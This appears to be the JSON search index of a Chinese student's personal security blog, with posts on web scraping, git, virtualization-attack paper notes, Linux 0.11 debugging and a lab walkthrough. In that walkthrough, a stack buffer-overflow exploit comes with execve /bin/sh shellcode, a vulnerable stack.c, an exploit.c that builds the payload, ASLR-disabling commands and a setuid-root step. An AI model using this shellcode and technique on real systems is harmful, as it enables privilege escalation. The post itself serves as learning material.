{"pages":[{"title":"Categories","text":"","path":"categories/index.html","date":"09-14","excerpt":""},{"title":"404","text":"","path":"404/index.html","date":"09-14","excerpt":""},{"title":"关于我","text":"标签：不太萌の小新 | 菜菜呱 | 日常丧 哎呀，其实吧，感觉自己真的很废柴呀，大学基本上就这么荒废过去啦，学习我也有好好学啊，可能还是自己没用吧，虽然真的很喜欢挖洞逆向ctf，但也仅仅停留在表面上，或许也正是因为没怎么动过手实践，不知其中艰辛，才一直对其念念不忘吧…… 还有啊，大神弟弟和其他大佬小哥哥真的都是超厉害的存在呢，所以我也一定一定要努力啊！ 最后一年的修仙时光了，如果再没有任何进步，可能真的要被发配回家种田了吧（；´д｀）ゞ(才不要咧 （所以，表面丧归丧，内心一定还要悄悄为自己加油鼓劲呀 \\(●&#39;◡&#39;●)ゞ） 花了两天搭出了这个很喜欢的博客，希望可以坚持下去~ 萌新进化，先从复现&amp;刷题开始吧！ 毕竟，我可是立志要当赏金猎人のcoolcool妖系boy吖！ 梦想还是要有的嘛，万一能实现呢，嘿 (●ˇ∀ˇ●)","path":"about/index.html","date":"09-21","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"09-14","excerpt":""},{"title":"Tagcloud","text":"","path":"tags/index.html","date":"09-14","excerpt":""}],"posts":[{"title":"5分钟——8行代码写爬虫","text":"（ emm, 大神5分钟，小白1小时 （小声皮(●’◡’●)/) 目标爬取豆瓣电影-一周口碑排行榜 代码12345678910111213import requestsfrom lxml import htmlurl = 'https://movie.douban.com/'headers = &#123;'Referer':'https://movie.douban.com/','User-Agent':'Mozilla/5.0 (Windows NT 10.0; xxx) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/xxx Safari/537.36'&#125;#headers要根据自己的浏览器来配置page = requests.get(url, headers=headers)tree = html.fromstring(page.text)result = tree.xpath('//td[@class=\"title\"]//a/text()')#print(page.text)print(result) 结果 爬到了豆瓣电影页面“一周口碑榜” 环境配置Windows + python3.8 刚开始有一些需要导入的库，如果以前没有下载过，要先打开cmd下载 12pip install requestspip install lxml 原理+步骤爬虫要点： 爬虫的网址 （douban.movie） 需要爬取的内容和数据 1result = tree.xpath('//td[@class=\"title\"]//a/text()') 这行也是关键的爬取代码 如何找到这部分？ 打开需要爬取的网页，按 F12，打开开发者工具 点左上角小箭头，此时鼠标选中网页各个模块（右键-检查），调试代码会自动跳转到相应的地方，找到要爬的部分 看到这一行，和关键代码有很多相似的地方。原理如下： ‘//td[@class=”title”]//a/text()’ 1）//td : 相当于指定大目录 2）[@class=”title”] : 指定小目录 3）//a : 最小的目录 4）/text() : 提取的数据 （就是按照网页的结构，一层层找到需要的爬取的数据所在的路径） 报错+调试最开始，由于代码缺少headers行，导致如下报错： 调试过程，注释掉result行，print(page.text) ，response 418 —— 说明请求出错 后来发现需要添加 headers 如何找到 headers F12开发者工具，Network-显示的request里随便点开一个 就会显示Headers，往下拉，找到User-Agent 把User-Agent 的内容copy到headers里 再运行，request 200，成功啦！ 补充小知识点：http 状态码1xx - 表示临时响应并需要请求者继续执行操作的状态代码 2xx - 请求成功 (200 - 表示成功处理了请求，一般情况下都是返回此状态码) 3xx - 重定向代码 4xx - 请求出错 5xx - 不常见，但也表示请求失败 详情参见 https://www.cnblogs.com/cjwxf/p/6186287.html （唔，有关 418 据说是个彩蛋： I am a teapot） 想学习爬虫可以了解：xpath / scarpy 致谢：hhh在本文最后要十分感谢我聪明可爱又温柔有耐心的大佬姐姐，（姐姐的官方名号还没定好，一定要想一个响当当的（lil tea小茶老师这种根本体现不出姐姐的威武鸭） 啊，感恩的心，感恩姐姐深夜远程指导，共同学习，共同进步~ 参考文献原实验： https://blog.csdn.net/csqazwsxedc/article/details/68498842 解决报错：https://blog.csdn.net/weixin_43144769/article/details/105715728?utm_medium=distribute.wap_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.wap_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase","path":"2020/07/17/20200718-5分钟学爬虫/","date":"07-17","excerpt":""},{"title":"git使用笔记","text":"入门篇 github 上创建仓库 GitTest（勾不勾选创建文件readme均可） 本地找到合适位置（例如F:）打开 git bash 若已有项目代码文件夹，则copy至F:路径下，e.g. GitTest, 没有就mkdir -&gt; cd git init git status //（可选）查看状态 git add . git commit -m “first commit - add a project” git remote add origin https://github.com/XXX/xxx.git git push -u origin master 命令行解释 git init 建好一个空仓库以后，多了一个.git的目录。这个目录是Git来跟踪管理版本库的，没事千万不要手动修改这个目录里面的文件，不然改乱了，就把Git仓库给破坏了。 最开始git status，会发现很多untracked files, git add . 之后就好了 git add . 告诉git，把文件添加到仓库 git commit -m “add files” 告诉git，把文件提交到仓库。 -m后是本次提交的说明，可以用来介绍自己做了哪些改动。 执行成功后会告诉你多少文件做了哪些改动 注：可以分次add，然后一步commit 即 123$ git add file1.txt$ git add file2.txt file3.txt$ git commit -m &quot;add 3 files.&quot; git remote add origin https://github.com/XXX/xxx.git ①关于本命令 把已有的本地仓库与github上创建的远程库关联 origin 是远程仓库的别名，以后可以使用这个短的别名代指长的url，这个是默认别名，也可以起自己喜欢的。 ②如果前面遇到一些问题，可能第二次remote的话会遇到 1fatal: remote origin already exists. 解决办法： git remote rm origin git remote add origin https://github.com/XXX/xxx.git 即可 git push -u origin master ①关于本命令 把本地库所有内容推送到远程库上 第一次加 -u 之后只要 git push origin master ②可能会遇到 12345678To https://github.com/xxx/xxx.git ! [rejected] master -&gt; master (fetch first)error: failed to push some refs to &apos;https://github.com/xxx/xxx.git&apos;hint: Updates were rejected because the remote contains work that you dohint: not have locally. This is usually caused by another repository pushinghint: to the same ref. You may want to first integrate the remote changeshint: (e.g., &apos;git pull ...&apos;) before pushing again.hint: See the &apos;Note about fast-forwards&apos; in &apos;git push --help&apos; for details. 出现这个问题的其中一个原因就是在远程创建仓库的时候，勾选了Initialize this repository with a README这项，导致远程仓库不为空。 解决办法：先将远程仓库的内容合并到本地，然后再上传，命令如下： git pull –rebase origin master git push -u origin master （被大佬姐姐强行拷问rebase含义，拔苗助长，萌新不应该这么早接触这个命令吧捂脸 rebase简介： \\git pull –rebase** 把本地 repo. 从上次 pull 之后的变更暂存 恢复到上次 pull 时的状态 合并远端的变更到本地 最后再合并刚刚暂存下來的本地变更 就是你本地的工作仓库的默认分支是master，origin/master是远程默认分支，本地和远程关联，由于远程有一个readme，相当于修改了远程分支，导致本地和远程不一致，这时，git pull –rebase origin master，把本地变更暂存，合并远端的变更（也就是 readme文件）到本地，再合并刚刚暂存的本地变更 参考链接 https://blog.csdn.net/JK198310/article/details/37881033 git rebase merge 区别 https://blog.csdn.net/weixin_30954607/article/details/98890341 git –rebase 实现的具体过程 https://blog.csdn.net/u013262534/article/details/81383058 git rebase 不同情况下的合并 (e.g.) 有一条代码线master线，同时有条新需求开发线dev线。master线从B开出分支dev线后，一直在做bug修复（C,D）。如下图： ​ E F G （dev） A B C D (master) 此时，dev线需要合并master线修复的bug，以免重复开发。那我们可以用到git rebase命令。 git rebase –onto master dev，成功后，dev线就会合并C和D提交的记录。 ​ EFG (dev) ABCD (master)","path":"2020/02/07/git/","date":"02-07","excerpt":""},{"title":"虚拟化攻防-相关论文-阅读笔记","text":"《Row Hammer漏洞攻击研究》-综述性质 原理：反复敲打（重复读取导致比特位反转） Arm架构 攻击方法：6个 缓存刷新技术 single-side double-side 三个参数：激活间隔、刷新间隔、数据格式 缓存驱逐技术 缓存驱逐集 非缓存访问指令 页表喷射 内存重复数据删除技术 内存伏击技术：预取边道攻击+页缓存驱逐 防御方法： 《KVM虚拟机的漏洞验证与利用方式研究》-王森-北京交通大学-硕士论文 热插拔PCI芯片-2011 FIFO -2015 PCNET -2015 防御方法：ASLR 感想： 真的是有好多要看的啊！！","path":"2019/03/16/2019-03-16-虚拟化攻防_相关论文_阅读笔记/","date":"03-16","excerpt":""},{"title":"《0day漏洞分析》","text":"第一章漏洞概述： bug &amp; Vulnerability：非预期错误，逻辑上缺陷+安全性缺陷 漏洞挖掘：本质上是一种测试（fuzz-灰盒测试） 漏洞分析：缓冲区溢出等等，通过逆向和调试，寻找PoC(proof of concept)重现漏洞被触发的现场。 漏洞利用：编写shellcode，exploit利用，形成攻击 0 day：指未被公布未被修复的漏洞，利用价值与危害最大，相应的还有1 day，5 day，即黑客们会在微软刚发布修补版本后研究这些补丁，寻找差异，未升级之前的一段时间都很危险 二进制概述 PE文件 文件偏移，Imagebase,VA，RVA， VA = ImageBase + RVA 文件偏移和RVA通常一样，但也可能不一样，因为有对齐（200，1000） 工具简介OD,SoftICE,IDA,Windbg 第二章可以参考《深入理解计算机系统》 函数调用 esp: 栈顶 ebp: 最上面栈的基地址 eip：指令寄存器，指向下一条等待执行的指令（控制它就控制了程序执行流程） 参数入栈，函数返回时恢复栈平衡（在母函数或子函数中进行） 步骤： 1）局部变量，参数入栈 push 参数 2）返回地址入栈 call funcA 完成2，3两个动作 3）代码跳转 4）栈帧调整 - push ebp （保存当前栈帧状态值，以备后续恢复本栈帧） - mov ebp,esp （更新栈底） - sub esp,xxx （抬高栈顶，开辟新栈帧） eg：main(){funcA();} 参数 funcA的局部变量 &lt;---funcA栈帧 前栈帧ebp &lt;---ebp1 返回地址 &lt;---call funcA的下一条指令 参数2 参数1 （参数从右往左入栈） 局部变量 &lt;--- (main函数栈帧) ebp1 --&gt; 函数返回步骤： 1）保存返回值（给eax） 2）回收当前栈帧 - add esp，xxx - pop ebp， - retn (返回地址弹给eip，代码跳去返回地址，恢复调用前的代码区） 3) 跳转 案例攻击方法1）修改邻接变量。相当于修改了用于判断的返回值，通过溢出跳转到if成功分支2）修改返回地址。相当于直接跳转到if成功分支3）代码植入。 汇编转机器码，跳转到攻击代码，执行我们想让他做的事","path":"2019/03/16/2018-11-24-0day/","date":"03-16","excerpt":""},{"title":"入门-缓冲区溢出与利用","text":"实验原理利用 strcpy(buf,str) 导致的缓冲区溢出，精心构造str溢出后，覆盖原程序的返回地址，让程序跳转至new_addr,去指定位置执行存放的shellcode，获得root权限 重点： str的构造-&gt;计算精确覆盖位置 shellcode 编写-&gt;提权功能，并转化成汇编 exploit 编写 Q: 这和控制流劫持一样吗？有啥区别？会不会控制流劫持是劫持eip？这个只是覆盖返回地址，不太一样？查一下啊！ 实验步骤1. 环境搭建1) Ubuntu12.04 32位 （http://releases.ubuntu.com/12.04.5/ubuntu-12.04.5-desktop-i386.iso）2) 关闭ASLR sudo sysctl -w kernel.randomize_va_space = 0 sudo sysctl kernel.randomize_va_space (用来查当前值是多少，0：关闭ASLR；***1：开启堆随机化？2：开启栈随机化？***) 3）stack-guard-protection和NX在后续gcc编译时关闭 2. 脚本编写1） shellcode：12345678#include &lt;stdio.h&gt;int main( )&#123; char *name[2]; name[0] = &quot;/bin/sh&quot;; name[1] = NULL; execve(name[0], name, NULL); //主要功能：获得一个shell&#125; 将shellcode转换成汇编形式，并编写call_shellcode调用代码，编译验证能否成功得到shell 【tips】: 如何编写shellcode（之后单写一篇吧） call_shellcode.c12345678910111213141516171819202122232425/* call_shellcode.c *//*A program that creates a file containing code for launching shell*/#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;const char code[] = &quot;\\x31\\xc0&quot; /* xorl %eax,%eax */ &quot;\\x50&quot; /* pushl %eax */ &quot;\\x68&quot;&quot;//sh&quot; /* pushl $0x68732f2f */ &quot;\\x68&quot;&quot;/bin&quot; /* pushl $0x6e69622f */ &quot;\\x89\\xe3&quot; /* movl %esp,%ebx */ &quot;\\x50&quot; /* pushl %eax */ &quot;\\x53&quot; /* pushl %ebx */ &quot;\\x89\\xe1&quot; /* movl %esp,%ecx */ &quot;\\x99&quot; /* cdq */ &quot;\\xb0\\x0b&quot; /* movb $0x0b,%al */ &quot;\\xcd\\x80&quot; /* int $0x80 */; //shellcode反汇编而成int main(int argc, char **argv)&#123; char buf[sizeof(code)]; strcpy(buf, code); ((void(*)( ))buf)( ); //？？？&#125; 编译运行 gcc -z execstack -fno-stack-protection -o call_shellcode call_shellcode.c ./call_shellcode $ 成功get shell(可以输id，whoami，ls等验证) 2） stack.c12345678910111213141516171819202122232425262728/* stack.c *//* This program has a buffer overflow vulnerability. *//* Our task is to exploit this vulnerability */#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int bof(char *str)&#123; char buffer[24]; /* The following statement has a buffer overflow problem */ strcpy(buffer, str); return 1;&#125;int main(int argc, char **argv)&#123; char str[517]; FILE *badfile; //创建badfile，之后将shellcode存于此文件 badfile = fopen(&quot;badfile&quot;, &quot;r&quot;); fread(str, sizeof(char), 517, badfile); //shellcode赋给str bof(str); printf(&quot;Returned Properly\\n&quot;); return 1;&#125; 关闭地址随机化后，每次运行地址相同。gdb动态调试stack,利用得到的ebp和buffer地址，计算应覆盖的返回地址值，用于exploit的编写 动态调试： $ gcc -z execstack -fno-stack-protector -g -o stack stack.c //要加-g 参数才能构建符号表 $ touch badfile $ gdb stack GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04 Copyright (C) 2012 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot; and &quot;show warranty&quot; for details. This GDB was configured as &quot;i686-linux-gnu&quot;. For bug reporting instructions, please see: &lt;http://bugs.launchpad.net/gdb-linaro/&gt;... Reading symbols from /home/x/Desktop/xx/stack...done. (gdb) b bof Breakpoint 1 at 0x804848a: file stack.c, line 14. (gdb) run Starting program: /home/x/Desktop/xx/stack Breakpoint 1, bof ( str=0xbffff0f7 &quot;\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220X\\361\\377\\277\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220&quot;...) at stack.c:14 14 strcpy(buffer, str); (gdb) p $ebp $1 = (void *) 0xbffff0d8 (gdb) p &amp;buffer $2 = (char (*)[24]) 0xbffff0b8 (gdb) p 0xbffff0d8-0xbffff0b8 $4 = 32 (gdb) quit 根据调试结果可得，ebp = 0xbffff0d8，返回地址在ebp上面，所以是ret = 0xbffff0d8+4可以跳转去的最小地址是 0xbffff0d8+8输入badfile中的buffer地址与ebp差32，返回地址ret在ebp上4，所以ret = buffer+32+4 4 | ret 4 | ebp 32 | ... | ... | buffer[0] 3） exploit.c为保证成功率，shellcode之前可以添加一些NOP，保证即使地址稍有偏移也可以完成利用123456789101112131415161718192021222324252627282930313233343536/* exploit.c *//* A program that creates a file containing code for launching shell*/#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;char shellcode[]= &quot;\\x31\\xc0&quot; /* xorl %eax,%eax */ &quot;\\x50&quot; /* pushl %eax */ &quot;\\x68&quot;&quot;//sh&quot; /* pushl $0x68732f2f */ &quot;\\x68&quot;&quot;/bin&quot; /* pushl $0x6e69622f */ &quot;\\x89\\xe3&quot; /* movl %esp,%ebx */ &quot;\\x50&quot; /* pushl %eax */ &quot;\\x53&quot; /* pushl %ebx */ &quot;\\x89\\xe1&quot; /* movl %esp,%ecx */ &quot;\\x99&quot; /* cdq */ &quot;\\xb0\\x0b&quot; /* movb $0x0b,%al */ &quot;\\xcd\\x80&quot; /* int $0x80 */;void main(int argc, char **argv)&#123; char buffer[517]; FILE *badfile; /* Initialize buffer with 0x90 (NOP instruction) */ memset(&amp;buffer, 0x90, 517); /* You need to fill the buffer with appropriate contents here */ *((long*)(buffer+36)) = 0xbffff0d8 + 0x80; //buffer+32+4 根据上述调试结果得到 memcpy(buffer+sizeof(buffer)-sizeof(shellcode), shellcode, sizeof(shellcode)); /* Save the contents to the file &quot;badfile&quot; */ badfile = fopen(&quot;./badfile&quot;, &quot;w&quot;); fwrite(buffer, 517, 1, badfile); fclose(badfile);&#125; 3. 脚本运行gcc -o exploit exploit.c ./exploit ./stack $ id uid=1000(s) gid=1000(s) groups=1000(s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare) 成功！ PS： 对stack设置UID，可以拿到root权限 $ gcc -o stack -z execstack -fno-stack-protector stack.c $ sudo chown root stack $ sudo chmod 4755 stack 小结我好讨厌写博客，实验做很快，复盘要很久（尤其调格式简直逼死强迫症==）不过回顾一下理清思路还挺有必要的，写博客麻烦还不是因为脑子乱==sad通过这一个缓冲区溢出的知识点可以展开再写几篇 如何编写shellcode控制流劫持与返回地址覆盖的区别VMware tools安装 先想到这么多，之后再补充","path":"2018/12/07/2018-12-07-bof/","date":"12-07","excerpt":""},{"title":"Ubuntu14.04下，利用QEMU+gdb调试Linux0.11内核","text":"步骤： 安装Ubuntu虚拟机 搭建调试环境 结合QEMU、gdb，开始调试 具体流程：1.安装Ubuntu虚拟机环境：VMware12，Ubuntu14.04 2.搭建调试环境1)安装必要依赖包（因为我是新安装的干净Ubuntu，里边还缺少常用软件） sudo apt-get update sudo apt-get upgrade (刚开始直接安总是报unable to locate package，应该是需要更新升级一下) sudo apt-get install vim cscope exuberant-ctags build-essential qemu lxterminal 2）下载Linux0.11内核源码到本地https://github.com/yuanxinyu/Linux-0.11 3）解压编译 cd Downloads unzip Linux-0.11-master.zip cd Linux-0.11-master make make start 4）调试 make debug ![](image/linux-0.11/make-debug.PNG&gt; （再开一个终端） gdb tools/system target remote localhost:1234 directory ./Linux-0.11-master //???设置源码目录 set architecture i8086 set dissamembly-flavor intel ![](image/linux-0.11/gdb-bootsect.PNG&gt; 然后似乎就可以gdb调试了？ b *0x7c00 c layout split x /16b 0x7df0 b main 3.gdb调试我还不太熟，每步含义都还要再去学一下 （嗯，先酱，明天继续……） 参考链接：http://blog.chinaunix.net/uid-26299634-id-4943500.htmlhttps://blog.csdn.net/longintchar/article/details/79685055https://github.com/tinyclub/linux-0.11-lab/blob/master/README.md 小结：哇，一开始真的是一脸懵啊，都不知道怎么入手，还好好多大佬都调过啦，还留了教程在网上，参考了几篇博客，也用我三脚猫的功夫仿了个大概，（也还不清楚原理==）目前看上去似乎接下来就是gdb调试代码，一步一步跟着走，看内核怎么运行的了，这块也还需要再看看书然后，听说是gdb版本啊之类的不兼容？所以linux0.11的编译文件啥的有了修改？上边链接里好像是大佬修改好的？等我明天gdb继续调，看别人文档的时候再研究一下（感觉真的好多不会，好多要学啊==大神弟弟说的果然没错）加油！","path":"2018/09/21/2018-09-21-Linux0.11_debug_with_qemu/","date":"09-21","excerpt":""},{"title":"vmware-tips","text":"问题：vmware虚拟机启动时遇到弹窗：“二进制转换与此平台长模式不兼容……” 原因：一般是由于电脑系统的 Virtualization Technology虚拟化技术功能 关闭导致的 解决方法：1.开机时按F2进入bios界面2.选择Configuration选项，将其中 Intel Virtual Technology由Disabled改为Enabled3.按F10，保存并退出，即可开启VT虚拟化功能4.保存后会自动重启电脑，之后就OK啦","path":"2018/09/17/2018-09-17-vmware_tips/","date":"09-17","excerpt":""},{"title":"萌新入坑","text":"不好意思啦 刚刚开始搭网站 不完善的地方 还请多多包涵！","path":"2018/09/16/2018-09-16-萌新入坑/","date":"09-16","excerpt":""}]}